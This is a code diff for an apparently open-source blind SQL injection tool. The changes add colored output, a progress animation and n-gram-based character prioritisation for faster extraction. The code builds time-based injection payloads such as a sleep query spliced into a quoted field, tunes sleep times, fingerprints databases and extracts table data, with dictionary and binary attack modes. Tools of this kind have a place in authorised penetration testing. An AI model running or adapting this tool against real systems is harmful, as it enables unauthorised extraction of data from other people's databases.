@@ -1318,9 +1369,11 @@ def threshold_type(request_info, args, constants):
     absolute_preference_threshold = baseline_avg * 0.05
 
     if max_pairwise_diff > absolute_preference_threshold and all(var < absolute_preference_threshold for var in variances.values()):
+        print_colored("+", "Threshold type found: Absolute")
         return "absolute", avg_variance
-
-    return "ratio", avg_variance
+    else:
+        print_colored("+", "Threshold type found: Ratio")
+        return "ratio", avg_variance
 
 
 def check_conditions(response, response_time, payload, db_info, baseline, args, on_match):
@@ -1400,7 +1453,7 @@ def detect(payload, request_info, db_info, constants, baseline, args):
         )
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during detection for {db_info.db_name}: {e}")
+        print_colored("!", f"Error during detection for {db_info.db_name}: {e}")
 
     return None
 
@@ -1409,7 +1462,9 @@ def lower(request_info, db_info, baseline, constants, args):
     """
     optimizes sleep time using a binary search algorithm.
     """
-    print("[*] Starting binary search for the minimum reliable sleep time...")
+    global current_animation
+    current_animation = DancingDots("Starting binary search for the minimum reliable sleep time", symbol='*')
+    current_animation.start()
     low = 1
     high = args.sleep_only
     payload = PayloadInfo(
@@ -1421,14 +1476,17 @@ def lower(request_info, db_info, baseline, constants, args):
     while low < high:
         mid = (low + high) // 2
         if args.verbose:
-            print(f"[VERBOSE] Testing sleep time: {mid} seconds")
+            print_colored("VERBOSE", f" Testing sleep time: {mid} seconds")
         sleep_query = sleep_query.replace('%', str(mid))
         new_payload = f"' AND {sleep_query} AND '1'='1"
         payload.payload = new_payload
         payload.encoded = quote(new_payload)
         if args.delay > 0:
             if args.verbose:
-                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
+
+                current_animation = DancingDots(f"Delaying for {args.delay} seconds",
+                                                     symbol="VERBOSE")
+                current_animation.start()
             time.sleep(args.delay)
 
         sleep_time = detect(
@@ -1441,13 +1499,73 @@ def lower(request_info, db_info, baseline, constants, args):
         if sleep_time:
             new_sleep = mid
             high = mid - 1
-            print(f"[+] Sleep time of {mid} seconds is reliable. Trying to lower further.")
+            print_colored("+", f"Sleep time of {mid} seconds is reliable. Trying to lower further.")
         else:
             low = mid + 1
-            print(f"[-] Sleep time of {mid} seconds is not reliable.")
+            print_colored("-", f"Sleep time of {mid} seconds is not reliable.")
 
-    print(f"[+] Reliable sleep time found: {new_sleep} seconds")
+    print_colored("+", f"Reliable sleep time found: {new_sleep} seconds")
     return new_sleep
+
+
+def prioritize_characters(extracted_chars, grams, position, length):
+    """
+    prioritizes characters based on the last 1-3 extracted characters using bigrams, trigrams, and quadgrams.
+    handles first and last characters of the data to be extracted as special cases.
+    fallback to general frequency-based prioritization if no match is found in the n-grams.
+    """
+    n = len(extracted_chars)
+    CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
+    quadgram_probs = trigram_probs = bigram_probs = {}
+    quadgram_total = trigram_total = bigram_total = 0
+
+    if position == 1:
+        char_probabilities = grams.get("starting_chars", {})
+        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
+        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+    elif position == length - 1:
+        char_probabilities = grams.get("ending_chars", {})
+        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
+        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+    else:
+        if n >= 3:
+            quad_key = extracted_chars[-3:]
+            quadgram_probs = {k: v for k, v in grams.get("quadgrams", {}).items() if k.startswith(quad_key)}
+            quadgram_total = sum(quadgram_probs.values())
+
+        if n >= 2:
+            trigram_key = extracted_chars[-2:]
+            trigram_probs = {k: v for k, v in grams.get("trigrams", {}).items() if k.startswith(trigram_key)}
+            trigram_total = sum(trigram_probs.values())
+
+        if n >= 1:
+            bigram_key = extracted_chars[-1:]
+            bigram_probs = {k: v for k, v in grams.get("bigrams", {}).items() if k.startswith(bigram_key)}
+            bigram_total = sum(bigram_probs.values())
+
+        if quadgram_total > trigram_total and quadgram_total > bigram_total:
+            sorted_chars = sorted(set(k[3] for k in quadgram_probs.keys()),
+                                  key=lambda k: -quadgram_probs.get(quad_key + k, 0))
+            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+        elif trigram_total > bigram_total:
+            sorted_chars = sorted(set(k[2] for k in trigram_probs.keys()),
+                                  key=lambda k: -trigram_probs.get(trigram_key + k, 0))
+            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+        elif bigram_total > 0:
+            sorted_chars = sorted(set(k[1] for k in bigram_probs.keys()),
+                                  key=lambda k: -bigram_probs.get(bigram_key + k, 0))
+            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+        char_probabilities = grams.get("characters", {})
+        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
+        all_chars = set(sorted_chars)
+        missing_chars = [char for char in CHARSET if char not in all_chars]
+
+        return sorted_chars + missing_chars
 
 
 def extract(payload, value, request_info, db_info, baseline, args):
@@ -1471,7 +1589,7 @@ def extract(payload, value, request_info, db_info, baseline, args):
         )
 
     except requests.exceptions.RequestException as e:
-        print(f"[-] Error during extraction for {value}: {e}")
+        print_colored("!", f"Error during extraction for {value}: {e}")
         return None
 
 
@@ -1535,50 +1653,50 @@ def arg_parse():
     if args.keywords:
         args.keywords = [kw.strip() for kw in args.keywords.split(',')]
     if not args.url:
-        errors.append("[!] You must provide a URL (-u).")
+        errors.append("You must provide a URL (-u).")
     if args.url and not args.file and not (args.injectable_headers or args.data or args.query_string):
-        errors.append("[!] You must provide either injectable headers (-ih), data (-d), or a query string (-qs) when specifying a URL without a request file (-f).")
+        errors.append("You must provide either injectable headers (-ih), data (-d), or a query string (-qs) when specifying a URL without a request file (-f).")
     if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
-        errors.append("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
+        errors.append("You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
     if args.data and args.file:
-        errors.append("[!] You cannot specify data for the request file outside of the request file.")
+        errors.append("You cannot specify data for the request file outside of the request file.")
     if (args.injectable_headers or args.static_headers) and args.file:
-        errors.append("[!] You cannot specify headers for the request file outside of the request file.")
+        errors.append("You cannot specify headers for the request file outside of the request file.")
     if args.sleep_only and args.sleep_only < 1:
-        errors.append("[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
+        errors.append("Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
     if args.query_string and args.file:
-        errors.append("[!] You cannot specify a query string (-qs) for the request file outside of the request file.")
+        errors.append("You cannot specify a query string (-qs) for the request file outside of the request file.")
     if args.data and args.query_string:
-        errors.append("[!] You cannot specify both data (-d) and a query string (-qs). Choose one.")
+        errors.append("You cannot specify both data (-d) and a query string (-qs). Choose one.")
     if args.data and "INJECT" not in args.data:
-        errors.append("[!] You must provide an INJECT placeholder for the payload. Example: -d 'username=sam&password=samspasswordINJECT'")
+        errors.append("You must provide an INJECT placeholder for the payload. Example: -d 'username=sam&password=samspasswordINJECT'")
     if args.query_string and "INJECT" not in args.query_string:
-        errors.append("[!] You must provide an INJECT placeholder for the payload. Example: -qs 'id=1INJECT&Submit=Submit'")
+        errors.append("You must provide an INJECT placeholder for the payload. Example: -qs 'id=1INJECT&Submit=Submit'")
     if args.timeout < 3:
-        errors.append("[!] Timeout value must be at least 3 seconds. The smaller the number the higher the fail rate. "
+        errors.append("Timeout value must be at least 3 seconds. The smaller the number the higher the fail rate. "
               "The recommended timeout is 10. Reconsider.")
     if args.top_n and not args.gramify:
-        errors.append("[!] You cannot specify a top number of n-grams without creating new n-grams. Example --gramify <file path> --top-n 5")
+        errors.append("You cannot specify a top number of n-grams without creating new n-grams. Example --gramify <file path> --top-n 5")
     if args.file and not os.path.exists(args.file):
-        errors.append(f"[!] The provided request file path {args.file} does not exist or cannot be accessed.")
+        errors.append(f"The provided request file path {args.file} does not exist or cannot be accessed.")
     if args.gramify and not os.path.exists(args.gramify):
-        errors.append(f"[!] The provided gramify file path {args.gramify} does not exist or cannot be accessed.")
+        errors.append(f"The provided gramify file path {args.gramify} does not exist or cannot be accessed.")
     if args.dictionary_attack and not os.path.exists(args.dictionary_attack):
-        errors.append(f"[!] The provided dictionary file path {args.dictionary_attack} does not exist or cannot be accessed.")
+        errors.append(f"The provided dictionary file path {args.dictionary_attack} does not exist or cannot be accessed.")
     if args.binary_attack and args.dictionary_attack:
-        errors.append("[!] Binary attacks and dictionary attacks are mutually exclusive. Choose one.")
+        errors.append("Binary attacks and dictionary attacks are mutually exclusive. Choose one.")
     if args.force == 'keyword' and not args.keywords:
-        errors.append("[!] You must provide keywords (--keywords) when forcing a keyword detection.")
+        errors.append("You must provide keywords (--keywords) when forcing a keyword detection.")
     if args.database and not args.force:
-        errors.append("[!] You must force a detection method when specifying a database. Example: --db mariadb --force sleep")
+        errors.append("You must force a detection method when specifying a database. Example: --db mariadb --force sleep")
     if args.dictionary_attack and args.gramify:
-        print("[*] Custom n-grams will only marginally speed up a dictionary attack. Feel free to use them, but measure your expectations.")
+        print_colored("*", "Custom n-grams will only marginally speed up a dictionary attack. Feel free to use them, but measure your expectations.")
     if args.sleep_only:
         args.timeout += args.sleep_only
 
     if errors:
         for error in errors:
-            print(error)
+            print_colored("!", error)
         return
     else:
         return args
@@ -1592,23 +1710,22 @@ def main():
     where all the magic happens
     """
 
-    logo='''
-        ___________________________________________________________________________________
-        __|____|______|__|____|________|___|___|____|____|______|_____|______|_______|___|_
-        ___|____|____|_____|______|___|___|_____|____|____|______|_______|_____|____|___|__
-        \_____    \|  |__|__|___|________|  /__|__\_____    \__|__|____|_____/  |_____|____
-        __|   |   /|  |__|  |_/    \__/ __ |__|_____|   |   /\    _ \|  |  \|    _\_/  _ \_
-        __|   |   \|  |__|  ||   |  \/ /_/ |____|___|   |   \_|  |_\/|  |  /_|  |__\   __/_
-        _/______  /|____/|__||___|  /\____ |_|_____/______  /_|__|___|____/__|__|___\___  /
-        ____|___\/___|____|_______\/______\/____|_____|___\/___|_______|_______|________\/_
-        _|_____|______|____|____|______|______|____|_____|______|_________|___|______|_____
-        '''
-
-    print(logo)
-
     args = arg_parse()
     if not args:
         return
+    logo = r'''
+            ___________________________________________________________________________________
+            __|____|______|__|____|________|___|___|____|____|______|_____|______|_______|___|_
+            ___|____|____|_____|______|___|___|_____|____|____|______|_______|_____|____|___|__
+            \_____    \|  |__|__|___|________|  /__|__\_____    \__|__|____|_____/  |_____|____
+            __|   |   /|  |__|  |_/    \__/ __ |__|_____|   |   /\    _ \|  |  \\    _\_/  _ \_
+            __|   |   \|  |__|  ||   |  \/ /_/ |____|___|   |   \_|  |_\/|  |  /_|  |__\   __/_
+            _/______  /|____/|__||___|  /\____ |_|_____/______  /_|__|___|____/__|__|___\___  /
+            ____|___\/___|____|_______\/______\/____|_____|___\/___|_______|_______|________\/_
+            _|_____|______|____|____|______|______|____|_____|______|_________|___|______|_____
+        '''
+    print(logo)
+
     json = load_queries()
     queries = json['queries']
     sleep_queries = json['sl_queries']
@@ -1651,10 +1768,10 @@ def main():
     if args.gramify:
         gramify_file_path = args.gramify
         if os.path.exists(gramify_file_path):
-            print(f"Generating n-grams from {gramify_file_path}...")
+            print_colored("*", f"Generating n-grams from {gramify_file_path}.")
             gramify(gramify_file_path, top_n=args.top_n)
         else:
-            print(f"Error: File {gramify_file_path} does not exist.")
+            print_colored("!", f"File {gramify_file_path} does not exist.")
             return
 
     grams_file = 'grams.json' if os.path.exists('grams.json') else 'standardgrams.json'
@@ -1682,7 +1799,7 @@ def main():
         db_info.injectable = True
         db_info.conditions, db_info.baseline_condition = (
             is_injectable(request_info=request_info, constants=constants, args=args))
-        print(f"[+] Skipping method discovery. Using forced detection method: {db_info.method}")
+        print_colored("+", f"Skipping method discovery. Using forced detection method: {db_info.method}")
     else:
         # Step 1: Check if the field is injectable
         db_info.injectable, db_info.baseline_condition, db_info.method, db_info.conditions, constants, args = (
@@ -1714,12 +1831,12 @@ def main():
                 db_info.db_name = db_name
                 break
         if db_queries:
-            print(f"[+] Skipping database detection. Using specified database: {db_name if not db_specific else db_specific}")
+            print_colored("+", f"Skipping database detection. Using specified database: {db_name if not db_specific else db_specific}")
             db_info.substring_query = db_queries.get("substring_query")
             db_info.sleep_query = db_queries.get("sleep_query") if not db_specific else db_queries["sleep_query"][db_specific]
             db_info.length_query = db_queries.get("length_query") if not db_specific else db_queries["length_query"][db_specific]
         else:
-            print(f"[-] Database '{db_name}' not found in the queries file. Exiting.")
+            print_colored("!", f"Database '{db_name}' not found in the queries file. Exiting.")
             return
     else:
         # Step 2: Count columns
@@ -1730,7 +1847,7 @@ def main():
     if not db_info.db_name:
         return
     elif not db_info.substring_query:
-        print(f"[*] Database {db_name} detected, but substring operations are not applicable.")
+        print_colored("!", f"Database {db_name} detected, but substring operations are not applicable.")
         return
 
     # Step 4: Discover length of data
@@ -1739,22 +1856,23 @@ def main():
     if not db_info.length:
         if no_length():
             length = args.max_length
-            print(f"[!] Data length not discovered. Defaulting to max length: {length} (adjust with --max-length)")
+            print_colored("*", f"Data length not discovered. Defaulting to max length: {length} (adjust with --max-length)")
         else:
-            print("[-] User chose not to proceed with extraction.")
+            print_colored("*", "User chose not to proceed with extraction.")
             return
 
     # Step 5: Extract the data
     extracted_data = extract_data(request_info=request_info, db_info=db_info, constants=constants, args=args)
+    begone_dancing_dots()
 
     # Step 6: Output the data
     if args.output_file:
         try:
             with open(args.output_file, 'w') as output_file:
                 output_file.write(extracted_data)
-            print(f"[+] Data written to {args.output_file}")
+            print_colored("+", f"Data written to {args.output_file}")
         except Exception as e:
-            print(f"[-] Error writing to output file: {e}")
+            print_colored("!", f"Error writing to output file: {e}")
             print(f"Extracted data: {extracted_data}")
     else:
         print(f"Extracted data: {extracted_data}")
